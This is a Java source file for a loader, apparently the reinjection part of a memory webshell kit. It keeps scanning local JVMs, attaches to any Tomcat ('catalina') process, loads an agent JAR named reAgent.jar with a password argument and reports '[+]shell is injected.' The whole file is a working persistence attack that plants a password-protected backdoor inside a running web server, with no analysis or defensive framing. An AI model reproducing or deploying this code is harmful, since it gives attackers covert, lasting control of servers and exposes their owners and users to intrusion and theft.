package net.sorry.agent;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.Iterator;
import java.util.List;

public class reAttach {
    public static void main(String[] args) throws Exception{
        if(args.length !=1){
            System.out.println("Usage:java -jar reInject.jar password");
        }else{
            VirtualMachine vm =null;
            List<VirtualMachineDescriptor> vmList = null;
            String password = args[0];
            String currentPath = reAttach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            //System.out.println("oldforcurrentPath:"+currentPath);
            currentPath = currentPath.substring(0,currentPath.lastIndexOf("/")+1);
            currentPath = java.net.URLDecoder.decode(currentPath, "utf-8");//解决空格或中文
            //System.out.println("newcurrentPath:"+currentPath);
            String agentFile = currentPath + "reAgent.jar";
            //System.out.println("agentFile:"+agentFile);
            agentFile = new File(agentFile).getCanonicalPath();
            String agentArgs = currentPath;
            if(!password.equals("")||password != null){
                agentArgs = agentArgs + "^" + password;
            }
            while(true){
                while(true){
                    try{
                        vmList = VirtualMachine.list();
                        if(vmList.size() > 0){
                            Iterator var8 = vmList.iterator();
                            while(var8.hasNext()){
                                VirtualMachineDescriptor vmd =(VirtualMachineDescriptor)var8.next();
                                if(vmd.displayName().indexOf("catalina") >= 0){
                                    System.out.println("[+]JVM's name is:   "+vmd.displayName());
                                    vm = VirtualMachine.attach(vmd);
                                    System.out.println("[+]OK.i find a jvm.");
                                    System.out.println("[+]OK.now the path of Agent JAR is:  "+agentFile);
                                    System.out.println("[+]OK.now the agentArgs is:     "+agentArgs);
                                    Thread.sleep(1000L);
                                    if(vm != null){
                                        vm.loadAgent(agentFile,agentArgs);
                                        System.out.println("[+]shell is injected.");
                                        vm.detach();
                                        return;
                                    }
                                }
                            }
                            Thread.sleep(3000);
                        }
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }

        }

    }
}
